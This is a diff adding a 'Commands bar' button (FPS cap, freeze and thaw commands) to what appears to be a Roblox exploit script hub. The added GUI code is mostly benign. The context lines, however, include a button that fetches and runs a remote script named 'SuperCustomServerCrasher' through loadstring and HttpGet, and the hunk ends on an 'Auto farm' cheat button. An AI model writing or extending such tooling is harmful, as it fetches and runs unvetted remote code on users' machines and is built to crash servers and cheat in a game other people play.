@@ -2983,6 +2983,71 @@
             loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
         end)
         local WarnFarm = false
+
+        Main:CreateButton('Commands bar', function()
+            -- Gui to Lua
+            -- Version: 3.2
+
+            -- Instances:
+
+            local ScreenGui = Instance.new("ScreenGui")
+            local Frame = Instance.new("Frame")
+            local TextBox = Instance.new("TextBox")
+
+            ScreenGui.Parent = game.CoreGui
+            ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+            Frame.Parent = ScreenGui
+            Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
+            Frame.BorderSizePixel = 0
+            Frame.Position = UDim2.new(0.609993935, 0, 0.365617454, 0)
+            Frame.Size = UDim2.new(0, 215, 0, 67)
+            Frame.Active = true
+            Frame.Draggable = true
+
+            TextBox.Parent = Frame
+            TextBox.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
+            TextBox.BorderSizePixel = 0
+            TextBox.Position = UDim2.new(0.0325581394, 0, 0.119402982, 0)
+            TextBox.Size = UDim2.new(0, 200, 0, 50)
+            TextBox.Font = Enum.Font.SourceSansBold
+            TextBox.Text = "Put command here:"
+            TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+            TextBox.TextSize = 14.000
+
+            -- Scripts:
+
+            local function YLTDGJ_fake_script() -- TextBox.LocalScript 
+                local script = Instance.new('LocalScript', TextBox)
+
+                function ExecCmd(cmd)
+                    local args = cmd:split(' ')
+                    
+                    if args[1] == 'fps' then
+                        setfpscap(args[2])
+                    end
+                    if args[1] == 'freeze' then
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+                    end
+                    if args[1] == 'thaw' then
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+                    end
+                    if args[1] == 'cmds' then
+                        print('fps <value>, freeze, thaw')
+                    end
+                end
+                
+                script.Parent.FocusLost:Connect(function(a)
+                    if a then
+                        ExecCmd(script.Parent.Text)
+                        wait()
+                        script.Parent.Text = 'Put command here:'
+                    end
+                end)
+            end
+            coroutine.wrap(YLTDGJ_fake_script)()
+
+        end)
         Main:CreateButton('Auto farm', function(button)
             if WarnFarm == false then
                 button.Text = 'Really?'
